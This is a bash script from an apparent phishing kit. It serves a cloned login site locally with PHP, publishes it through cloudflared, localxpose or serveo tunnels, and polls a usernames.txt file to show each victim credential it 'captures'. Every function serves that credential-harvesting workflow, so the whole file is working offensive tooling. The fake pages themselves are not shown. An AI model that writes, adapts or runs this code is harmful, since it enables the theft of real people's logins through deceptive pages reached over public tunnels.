tunneldeps() {
    mkdir -p tunneler .server
    if [[ ! -f "tunneler/cloudflared" ]]; then
        printf "${blue}[i] ${white}downloading cloudflared . . .${reset}\n"
        if [[ "$(uname -m)" == "aarch64" ]] || [[ "$(uname -m)" == "arm64" ]]; then
            curl -L -o tunneler/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64
        else
            curl -L -o tunneler/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        fi
        chmod +x tunneler/cloudflared
    fi
    if [[ ! -f "tunneler/loclx" ]]; then
        printf "${blue}[i] ${white}downloading localxpose . . .${reset}\n"
        if [[ "$(uname -m)" == "aarch64" ]] || [[ "$(uname -m)" == "arm64" ]]; then
            curl -L -o tunneler/loclx https://github.com/localxpose/loclx-binaries/releases/latest/download/loclx-linux-arm64
        else
            curl -L -o tunneler/loclx https://github.com/localxpose/loclx-binaries/releases/latest/download/loclx-linux-amd64
        fi
        chmod +x tunneler/loclx
    fi
}

tunnelmenu() {
    banner
    printf "${green}  [01]${white} localhost\n"
    printf "${green}  [02]${white} cloudflared\n"
    printf "${green}  [03]${white} localxpose\n"
    printf "${green}  [04]${white} serveo\n"
    printf "\n${blue}┌─[${white}select tunnel${blue}]──[${white}~${blue}]\n${blue}└──╼ ${white}"
    read -r tunnchoice
    case $tunnchoice in
        1) startlocal;; 2) startcloudflared;; 3) startlocalxpose;; 4) startserveo;;
        *) tunnelmenu;;
    esac
}

startlocal() {
    banner
    printf "${green}[i] ${white}starting php server on port $port ...${reset}\n"
    cd .sites/"$site" || exit
    php -S 127.0.0.1:"$port" >/dev/null 2>&1 &
    phppid=$!
    cd ../../
    tunnelurl="http://127.0.0.1:$port"
    capture
}

startcloudflared() {
    banner
    tunneldeps
    printf "${green}[i] ${white}starting php server on port $port ...${reset}\n"
    cd .sites/"$site" || exit
    php -S 127.0.0.1:"$port" >/dev/null 2>&1 &
    phppid=$!
    cd ../../
    printf "${green}[i] ${white}starting cloudflared tunnel ...${reset}\n"
    ./tunneler/cloudflared tunnel --url http://127.0.0.1:"$port" > .server/log 2>&1 &
    cfpid=$!
    sleep 8
    tunnelurl=$(grep -o 'https://[-a-zA-Z0-9.]*trycloudflare.com' .server/log | head -1)
    if [[ -z "$tunnelurl" ]]; then
        printf "${red}[!] ${white}failed to start cloudflared tunnel.${reset}\n"
        exit 1
    fi
    capture
}

startlocalxpose() {
    banner
    tunneldeps
    printf "${green}[i] ${white}starting php server on port $port ...${reset}\n"
    cd .sites/"$site" || exit
    php -S 127.0.0.1:"$port" >/dev/null 2>&1 &
    phppid=$!
    cd ../../
    printf "${green}[i] ${white}starting localxpose tunnel ...${reset}\n"
    printf "${blue}[?] ${white}change region (y/n) [default auto] : ${reset}"
    read -r regionchoice
    if [[ "$regionchoice" == "y" ]]; then
        printf "${blue}[?] ${white}region (us/eu) : ${reset}"
        read -r region
        regionflag="--region $region"
    else
        regionflag=""
    fi
    printf "${blue}[?] ${white}custom name (y/n) [default random] : ${reset}"
    read -r subchoice
    if [[ "$subchoice" == "y" ]]; then
        printf "${blue}[?] ${white}enter name : ${reset}"
        read -r subname
        subflag="--subdomain $subname"
    else
        subflag=""
    fi
    ./tunneler/loclx tunnel http --port "$port" $regionflag $subflag > .server/log 2>&1 &
    loclxpid=$!
    sleep 8
    tunnelurl=$(grep -o 'https://[-a-zA-Z0-9.]*loclx.io' .server/log | head -1)
    if [[ -z "$tunnelurl" ]]; then
        printf "${red}[!] ${white}failed to start localxpose tunnel.${reset}\n"
        exit 1
    fi
    capture
}

startserveo() {
    banner
    printf "${green}[i] ${white}starting php server on port $port ...${reset}\n"
    cd .sites/"$site" || exit
    php -S 127.0.0.1:"$port" >/dev/null 2>&1 &
    phppid=$!
    cd ../../
    printf "${green}[i] ${white}starting serveo tunnel ...${reset}\n"
    printf "${blue}[?] ${white}custom name (y/n) [default random] : ${reset}"
    read -r subchoice
    if [[ "$subchoice" == "y" ]]; then
        printf "${blue}[?] ${white}enter name : ${reset}"
        read -r subname
        subflag="-R $subname"
    else
        subflag=""
    fi
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 $subflag:80:127.0.0.1:"$port" serveo.net > .server/log 2>&1 &
    serveopid=$!
    sleep 8
    tunnelurl=$(grep -o 'https://[-a-zA-Z0-9.]*serveo.net' .server/log | head -1)
    if [[ -z "$tunnelurl" ]]; then
        printf "${red}[!] ${white}failed to start serveo tunnel.${reset}\n"
        exit 1
    fi
    capture
}

capture() {
    clear
    banner
    printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
    printf "${green}[i] ${white}waiting for credentials ...${reset}\n"
    printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
    local lastcount=0
    if [[ -f ".sites/$site/usernames.txt" ]]; then
        lastcount=$(wc -l < ".sites/$site/usernames.txt" 2>/dev/null)
    fi
    while true; do
        if [[ -f ".sites/$site/usernames.txt" ]]; then
            local currentcount=$(wc -l < ".sites/$site/usernames.txt" 2>/dev/null)
            if [[ "$currentcount" -gt "$lastcount" ]]; then
                clear
                banner
                printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
                printf "${green}[+] ${white}new credentials captured :${reset}\n\n"
                tail -n "$((currentcount - lastcount))" ".sites/$site/usernames.txt"
                printf "\n${green}[i] ${white}waiting for more ...${reset}\n"
                printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
                lastcount=$currentcount
            fi
        fi
        sleep 1
    done
}
